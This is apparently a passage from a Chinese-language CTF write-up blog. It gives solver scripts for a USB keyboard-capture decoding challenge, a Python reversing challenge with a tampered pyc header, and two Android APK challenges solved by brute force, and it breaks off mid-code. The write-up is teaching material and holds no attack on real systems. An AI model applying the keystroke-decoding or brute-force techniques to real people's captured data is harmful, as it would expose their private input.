class="string">"05"</span>:<span class="string">"b"</span>, <span class="string">"06"</span>:<span class="string">"c"</span>, <span class="string">"07"</span>:<span class="string">"d"</span>, <span class="string">"08"</span>:<span class="string">"e"</span>, <span class="string">"09"</span>:<span class="string">"f"</span>, <span class="string">"0a"</span>:<span class="string">"g"</span>, <span class="string">"0b"</span>:<span class="string">"h"</span>, <span class="string">"0c"</span>:<span class="string">"i"</span>, <span class="string">"0d"</span>:<span class="string">"j"</span>, <span class="string">"0e"</span>:<span class="string">"k"</span>, <span class="string">"0f"</span>:<span class="string">"l"</span>, <span class="string">"10"</span>:<span class="string">"m"</span>, <span class="string">"11"</span>:<span class="string">"n"</span>, <span class="string">"12"</span>:<span class="string">"o"</span>, <span class="string">"13"</span>:<span class="string">"p"</span>, <span class="string">"14"</span>:<span class="string">"q"</span>, <span class="string">"15"</span>:<span class="string">"r"</span>, <span class="string">"16"</span>:<span class="string">"s"</span>, <span class="string">"17"</span>:<span class="string">"t"</span>, <span class="string">"18"</span>:<span class="string">"u"</span>, <span class="string">"19"</span>:<span class="string">"v"</span>, <span class="string">"1a"</span>:<span class="string">"w"</span>, <span class="string">"1b"</span>:<span class="string">"x"</span>, <span class="string">"1c"</span>:<span class="string">"y"</span>, <span class="string">"1d"</span>:<span class="string">"z"</span>,<span class="string">"1e"</span>:<span class="string">"1"</span>, <span class="string">"1f"</span>:<span class="string">"2"</span>, <span class="string">"20"</span>:<span class="string">"3"</span>, <span class="string">"21"</span>:<span class="string">"4"</span>, <span class="string">"22"</span>:<span class="string">"5"</span>, <span class="string">"23"</span>:<span class="string">"6"</span>,<span class="string">"24"</span>:<span class="string">"7"</span>,<span class="string">"25"</span>:<span class="string">"8"</span>,<span class="string">"26"</span>:<span class="string">"9"</span>,<span class="string">"27"</span>:<span class="string">"0"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"-"</span>,<span class="string">"2e"</span>:<span class="string">"="</span>,<span class="string">"2f"</span>:<span class="string">"["</span>,<span class="string">"30"</span>:<span class="string">"]"</span>,<span class="string">"31"</span>:<span class="string">"\\"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">";"</span>,<span class="string">"34"</span>:<span class="string">"'"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">","</span>,<span class="string">"37"</span>:<span class="string">"."</span>,<span class="string">"38"</span>:<span class="string">"/"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">"04"</span>:<span class="string">"A"</span>, <span class="string">"05"</span>:<span class="string">"B"</span>, <span class="string">"06"</span>:<span class="string">"C"</span>, <span class="string">"07"</span>:<span class="string">"D"</span>, <span class="string">"08"</span>:<span class="string">"E"</span>, <span class="string">"09"</span>:<span class="string">"F"</span>, <span class="string">"0a"</span>:<span class="string">"G"</span>, <span class="string">"0b"</span>:<span class="string">"H"</span>, <span class="string">"0c"</span>:<span class="string">"I"</span>, <span class="string">"0d"</span>:<span class="string">"J"</span>, <span class="string">"0e"</span>:<span class="string">"K"</span>, <span class="string">"0f"</span>:<span class="string">"L"</span>, <span class="string">"10"</span>:<span class="string">"M"</span>, <span class="string">"11"</span>:<span class="string">"N"</span>, <span class="string">"12"</span>:<span class="string">"O"</span>, <span class="string">"13"</span>:<span class="string">"P"</span>, <span class="string">"14"</span>:<span class="string">"Q"</span>, <span class="string">"15"</span>:<span class="string">"R"</span>, <span class="string">"16"</span>:<span class="string">"S"</span>, <span class="string">"17"</span>:<span class="string">"T"</span>, <span class="string">"18"</span>:<span class="string">"U"</span>, <span class="string">"19"</span>:<span class="string">"V"</span>, <span class="string">"1a"</span>:<span class="string">"W"</span>, <span class="string">"1b"</span>:<span class="string">"X"</span>, <span class="string">"1c"</span>:<span class="string">"Y"</span>, <span class="string">"1d"</span>:<span class="string">"Z"</span>,<span class="string">"1e"</span>:<span class="string">"!"</span>, <span class="string">"1f"</span>:<span class="string">"@"</span>, <span class="string">"20"</span>:<span class="string">"#"</span>, <span class="string">"21"</span>:<span class="string">"$"</span>, <span class="string">"22"</span>:<span class="string">"%"</span>, <span class="string">"23"</span>:<span class="string">"^"</span>,<span class="string">"24"</span>:<span class="string">"&amp;"</span>,<span class="string">"25"</span>:<span class="string">"*"</span>,<span class="string">"26"</span>:<span class="string">"("</span>,<span class="string">"27"</span>:<span class="string">")"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"_"</span>,<span class="string">"2e"</span>:<span class="string">"+"</span>,<span class="string">"2f"</span>:<span class="string">"&#123;"</span>,<span class="string">"30"</span>:<span class="string">"&#125;"</span>,<span class="string">"31"</span>:<span class="string">"|"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">"\""</span>,<span class="string">"34"</span>:<span class="string">":"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">"&lt;"</span>,<span class="string">"37"</span>:<span class="string">"&gt;"</span>,<span class="string">"38"</span>:<span class="string">"?"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line"></span><br><span class="line">message = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> Lines:</span><br><span class="line">    <span class="keyword">if</span>  len(line.replace(<span class="string">'\n'</span>,<span class="string">''</span>))!=<span class="number">16</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span> normalKeys.get(line[<span class="number">4</span>:<span class="number">6</span>]) != <span class="literal">None</span>:</span><br><span class="line">        message += normalKeys.get(line[<span class="number">4</span>:<span class="number">6</span>])</span><br><span class="line"><span class="keyword">print</span> message</span><br></pre></td></tr></table></figure><ul><li>得到压缩包密码,解压即可得到flag.txt,里面就有flag。</li></ul><h1 id="0x05-Re"><a href="#0x05-Re" class="headerlink" title="0x05 Re"></a>0x05 Re</h1><h2 id="0x001Python是世界上最好的语言"><a href="#0x001Python是世界上最好的语言" class="headerlink" title="0x001Python是世界上最好的语言"></a>0x001Python是世界上最好的语言</h2><ul><li>比赛时这道题反编译总是不成功,还以为是工具出了问题…结果比完以后大佬告诉我pyc的文件头被改了…</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/aaaaa.jpg" alt></p><ul><li>正常的pyc的文件头应该是<code>03 F3 0D 0A</code>,而这道题被改成<code>20 19 0D 0A</code>, 把文件头再改回来以后就可以正常反编译了。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191105080300.png" alt></p><ul><li><p>这算法和素数有关,懒得逆回去了,直接正向爆破(因为知道了输出)。</p></li><li><p>根据其他题的flag, 这道题目的flag也会是由<code>0123456789abcdef</code>以及<code>lg{}</code>(用来组成flag)组成,那么只需要解出来这些里的每个字符的输出, 然后去跟题目给的输出进行比对就能找出flag。(如果觉得flag还会由其他字符组成,可自行尝试,原理一样)</p></li><li><p>所以Python脚本如下,写脚本的能力还是有待提高啊!</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="comment">#可能存在于flag中的字符。</span></span><br><span class="line">flagtable = <span class="string">'0123456789abcdeflg&#123;&#125;'</span></span><br><span class="line"><span class="comment">#定义的一个字典,用于保存flag字符及其对应的键值。</span></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"></span><br><span class="line">Sd = []</span><br><span class="line">SdSd = []</span><br><span class="line"><span class="keyword">for</span> SdSdSdSd <span class="keyword">in</span> flagtable:</span><br><span class="line">    Sd.append(ord(SdSdSdSd))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(SdSdSd)</span>:</span></span><br><span class="line">    SdSdSdSdSd = <span class="literal">True</span></span><br><span class="line">    SdSdSdSd = <span class="number">2</span></span><br><span class="line">    sq = int(math.sqrt(SdSdSd)) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> SdSdSdSd &lt;= sq:</span><br><span class="line">        <span class="keyword">if</span> SdSdSd % SdSdSdSd == <span class="number">0</span>:</span><br><span class="line">            SdSd.append(SdSdSdSd + <span class="number">1</span>)</span><br><span class="line">            SdSdSdSdSd = <span class="literal">False</span></span><br><span class="line">            func(SdSdSd / SdSdSdSd)</span><br><span class="line">            SdSdSdSd += <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        SdSdSdSd += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> SdSdSdSdSd:</span><br><span class="line">        SdSd.append(SdSdSd + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> SdSdSdSd <span class="keyword">in</span> Sd:</span><br><span class="line">    func(SdSdSdSd)</span><br><span class="line">    dic.update( &#123;chr(SdSdSdSd) : SdSd&#125; )<span class="comment">#这个位置根据题目的py脚本改的。</span></span><br><span class="line">    SdSd = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#自己定义了一个根据键值寻找键的函数,python好像没有现成的函数？</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key</span><span class="params">(d,value)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [k <span class="keyword">for</span> k,v <span class="keyword">in</span> d.items() <span class="keyword">if</span> v == value]</span><br><span class="line"></span><br><span class="line"><span class="comment">#这三行把out.txt的内容转换成了一个List的形式, print s以后直接把输出结果复制粘贴,然后赋值给outList就行~</span></span><br><span class="line"><span class="comment">#outstr = '''['3', '4', '18'] ['3', '3', '4', '4', '4'] ['98'] ['104'] ['4', '42'] ['102'] ['3', '8', '8'] ['3', '3', '3', '3', '4'] ['4', '4', '12'] ['3', '4', '18'] ['3', '6', '6'] ['3', '4', '18'] ['8', '8'] ['3', '8', '8'] ['3', '4', '18'] ['4', '4', '12'] ['4', '20'] ['4', '20'] ['4', '20'] ['3', '3', '3', '3', '4'] ['102'] ['102'] ['4', '18'] ['3', '3', '6', '6'] ['4', '18'] ['4', '20'] ['4', '20'] ['98'] ['3', '6', '6'] ['3', '8', '8'] ['3', '8', '8'] ['3', '3', '6', '6'] ['102'] ['4', '18'] ['3', '3', '6', '6'] ['3', '3', '6', '6'] ['3', '3', '14'] ['6', '6', '6']'''</span></span><br><span class="line"><span class="comment">#s = outstr.replace('\'' , '').replace('] [' , '] , [')</span></span><br><span class="line"><span class="comment">#print s</span></span><br><span class="line"></span><br><span class="line">outList = [[<span class="number">3</span>, <span class="number">4</span>, <span class="number">18</span>] , [<span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>] , [<span class="number">98</span>] , [<span class="number">104</span>] , [<span class="number">4</span>, <span class="number">42</span>] , [<span class="number">102</span>] , </span><br><span class="line">           [<span class="number">3</span>, <span class="number">8</span>, <span class="number">8</span>] , [<span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>] , [<span class="number">4</span>, <span class="number">4</span>, <span class="number">12</span>] , [<span class="number">3</span>, <span class="number">4</span>, <span class="number">18</span>] , [<span class="number">3</span>, <span class="number">6</span>, <span class="number">6</span>] , </span><br><span class="line">           [<span class="number">3</span>, <span class="number">4</span>, <span class="number">18</span>] , [<span class="number">8</span>, <span class="number">8</span>] , [<span class="number">3</span>, <span class="number">8</span>, <span class="number">8</span>] , [<span class="number">3</span>, <span class="number">4</span>, <span class="number">18</span>] , [<span class="number">4</span>, <span class="number">4</span>, <span class="number">12</span>] , [<span class="number">4</span>, <span class="number">20</span>] ,</span><br><span class="line">           [<span class="number">4</span>, <span class="number">20</span>] , [<span class="number">4</span>, <span class="number">20</span>] , [<span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>] , [<span class="number">102</span>] , [<span class="number">102</span>] , [<span class="number">4</span>, <span class="number">18</span>] , </span><br><span class="line">           [<span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">6</span>] , [<span class="number">4</span>, <span class="number">18</span>] , [<span class="number">4</span>, <span class="number">20</span>] , [<span class="number">4</span>, <span class="number">20</span>] , [<span class="number">98</span>] , [<span class="number">3</span>, <span class="number">6</span>, <span class="number">6</span>] , </span><br><span class="line">           [<span class="number">3</span>, <span class="number">8</span>, <span class="number">8</span>] , [<span class="number">3</span>, <span class="number">8</span>, <span class="number">8</span>] , [<span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">6</span>] , [<span class="number">102</span>] , [<span class="number">4</span>, <span class="number">18</span>] , [<span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">6</span>] , </span><br><span class="line">           [<span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">6</span>] , [<span class="number">3</span>, <span class="number">3</span>, <span class="number">14</span>] , [<span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>]]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> outList:</span><br><span class="line">    flag += get_key(dic,key)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h1 id="0x06-Moble"><a href="#0x06-Moble" class="headerlink" title="0x06 Moble"></a>0x06 Moble</h1><h2 id="0x001-简单的apk"><a href="#0x001-简单的apk" class="headerlink" title="0x001 简单的apk"></a>0x001 简单的apk</h2><ul><li>根据关键算法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">check</span><span class="params">(String paramString)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Object localObject = paramString.toCharArray();</span><br><span class="line">  <span class="keyword">if</span> (localObject.length == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"请输入内容"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; localObject.length; j++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (localObject[j] &lt; <span class="string">'0'</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"你的输入应该为纯数字！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (localObject[j] &gt; <span class="string">'9'</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"你的输入应该为纯数字！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (localObject.length != <span class="number">15</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"出错啦！"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  localObject = <span class="string">""</span>;</span><br><span class="line">  <span class="keyword">for</span> (j = i; j &lt; paramString.length(); j++)</span><br><span class="line">  &#123;</span><br><span class="line">    StringBuilder localStringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    localStringBuilder.append((String)localObject);</span><br><span class="line">    i = paramString.charAt(j);</span><br><span class="line">    localStringBuilder.append(<span class="keyword">new</span> <span class="keyword">char</span>[] &#123; <span class="number">83</span>, <span class="number">100</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">99</span>, <span class="number">50</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">57</span> &#125;[(i - <span class="number">48</span>)]);</span><br><span class="line">    localObject = localStringBuilder.toString();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (((String)localObject).equals(<span class="string">"sic19Sdc02ds10c"</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    localObject = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    ((StringBuilder)localObject).append(<span class="string">"flag&#123;"</span>);</span><br><span class="line">    ((StringBuilder)localObject).append(md5(paramString));</span><br><span class="line">    ((StringBuilder)localObject).append(<span class="string">"&#125;"</span>);</span><br><span class="line">    <span class="keyword">return</span> ((StringBuilder)localObject).toString();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"你输入的数字不正确"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>可以得到脚本如下:</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line">s = <span class="string">'sic19Sdc02ds10c'</span></span><br><span class="line">L = [<span class="number">83</span>, <span class="number">100</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">99</span>, <span class="number">50</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">57</span>]</span><br><span class="line">input = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    input += str(L.index(ord(i)))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">'flag&#123;'</span> + md5.md5(input).hexdigest() + <span class="string">'&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h2 id="0x002-贪吃蛇"><a href="#0x002-贪吃蛇" class="headerlink" title="0x002 贪吃蛇"></a>0x002 贪吃蛇</h2><ul><li>关键函数在这俩</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191106164530.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191106164553.png" alt></p><ul><li><p>根据代码可以得知,paramInt1应该为90, 然后由paramInt1、paramInt2、paramInt3组成的字符串总共8位。</p></li><li><p>没必要逆算法,直接正向爆破。</p></li><li><p>鉴于str的形式可能是<code>90XXXXXX(其中第一个X取值为1~9)</code>,也可能是<code>900XXXXX</code>,所以采用如下方法进行爆破。(应该会有更优的方案。)</p></li><li><p>把<code>encrypt(int paramInt1, int paramInt2, int paramInt3)</code>变成<code>encrypt(int paramInt1)</code>,下面只保留<code>((StringBuilder)localObject).append(String.valueOf(paramInt1));</code>,这样算是为了方便爆破吧…</p></li><li><p>爆破脚本如下(Java):</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test_for_ctf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">encode</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">	  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String Code = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>;</span><br><span class="line">	  </span><br><span class="line">	  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">encode</span><span class="params">(String paramString)</span></span></span><br><span class="line"><span class="function">	  </span>&#123;</span><br><span class="line">	    <span class="keyword">if</span> ((paramString != <span class="keyword">null</span>) &amp;&amp; (paramString.length() != <span class="number">0</span>))</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">char</span>[] arrayOfChar = paramString.toCharArray();</span><br><span class="line">	      StringBuilder localStringBuilder1 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">	      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arrayOfChar.length; i++)</span><br><span class="line">	      &#123;</span><br><span class="line">	        StringBuilder localStringBuilder2;</span><br><span class="line">	        String localObject;</span><br><span class="line">			<span class="keyword">for</span> (localObject = Integer.toBinaryString(arrayOfChar[i]); ((String)localObject).length() &lt; <span class="number">8</span>; localObject = localStringBuilder2.toString())</span><br><span class="line">	        &#123;</span><br><span class="line">	          localStringBuilder2 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">	          localStringBuilder2.append(<span class="string">"0"</span>);</span><br><span class="line">	          localStringBuilder2.append((String)localObject);</span><br><span class="line">	        &#125;</span><br><span class="line">	        localStringBuilder1.append((String)localObject);</span><br><span class="line">	      &#125;</span><br><span class="line">	      <span class="keyword">while</span> (localStringBuilder1.length() % <span class="number">6</span> != <span class="number">0</span>) &#123;</span><br><span class="line">	        localStringBuilder1.append(<span class="string">"0"</span>);</span><br><span class="line">	      &#125;</span><br><span class="line">	      Object localObject = String.valueOf(localStringBuilder1);</span><br><span class="line">	      arrayOfChar = <span class="keyword">new</span> <span class="keyword">char</span>[((String)localObject).length() / <span class="number">6</span>];</span><br><span class="line">	      <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; arrayOfChar.length; i++)</span><br><span class="line">	      &#123;</span><br><span class="line">	        <span class="keyword">int</span> j = Integer.parseInt(((String)localObject).substring(<span class="number">0</span>, <span class="number">6</span>), <span class="number">2</span>);</span><br><span class="line">	        localObject = ((String)localObject).substring(<span class="number">6</span>);</span><br><span class="line">	        arrayOfChar[i] = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>.charAt(j);</span><br><span class="line">	      &#125;</span><br><span class="line">	      localObject = <span class="keyword">new</span> StringBuilder(String.valueOf(arrayOfChar));</span><br><span class="line">	      <span class="keyword">if</span> (paramString.length() % <span class="number">3</span> == <span class="number">1</span>) &#123;</span><br><span class="line">	        ((StringBuilder)localObject).append(<span class="string">"=="</span>);</span><br><span class="line">	      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (paramString.length() % <span class="number">3</span> == <span class="number">2</span>) &#123;</span><br><span class="line">	        ((StringBuilder)localObject).append(<span class="string">"="</span>);</span><br><span class="line">	      &#125;</span><br><span class="line">	      <span class="keyword">for</span> (i = <span class="number">76</span>; i &lt; ((StringBuilder)localObject).length(); i += <span 